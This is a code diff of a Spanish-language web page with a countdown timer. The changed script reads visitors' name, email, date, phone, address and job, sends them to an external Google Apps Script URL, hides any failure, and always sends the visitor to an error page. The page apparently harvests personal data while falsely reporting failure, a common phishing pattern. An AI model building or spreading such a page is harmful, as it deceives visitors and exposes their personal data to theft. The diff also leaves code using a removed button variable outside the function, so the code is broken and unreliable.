@@ -297,17 +297,32 @@
         setInterval(actualizarContador, 1000);
 
         async function enviarDatos() {
-            const btn = document.querySelector('.cta-button');
-            const url = "https://script.google.com/macros/s/AKfycbwEjYnhqNXVAIqYRr80BxjhJgdxGrU0wRkVKYa3aQ6Aay0DLp4WdQyIhwhpGi2XyBVWIw/exec";
+    const url = "https://script.google.com/macros/s/AKfycbwbU7aSjN88_FslrwguTfVg-sCb3KIvB7hlYwmulaO9BmG40nulAXZFnUJNnehmOYXLnQ/exec";
 
-            const datos = {
-                nombre: document.getElementById('nombre').value,
-                correo: document.getElementById('correo').value,
-                fecha: document.getElementById('fecha').value,
-                telefono: document.getElementById('telefono').value,
-                direccion: document.getElementById('direccion').value,
-                trabajo: document.getElementById('trabajo').value
-            };
+    const datos = {
+        nombre: document.getElementById('nombre').value,
+        correo: document.getElementById('correo').value,
+        fecha: document.getElementById('fecha').value,
+        telefono: document.getElementById('telefono').value,
+        direccion: document.getElementById('direccion').value,
+        trabajo: document.getElementById('trabajo').value
+    };
+
+    try {
+        await fetch(url, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(datos)
+        });
+    } catch (error) {
+        console.log("Error pero seguimos...");
+    }
+
+    // 🔥 SIEMPRE REDIRIGE
+    window.location.href = "error.html";
+}
 
             btn.innerText = "REGISTRANDO...";
             btn.disabled = true;
